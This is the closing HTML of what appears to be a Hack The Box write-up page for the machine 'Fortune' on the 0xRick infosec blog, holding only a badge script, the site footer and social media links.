  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/fortune/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

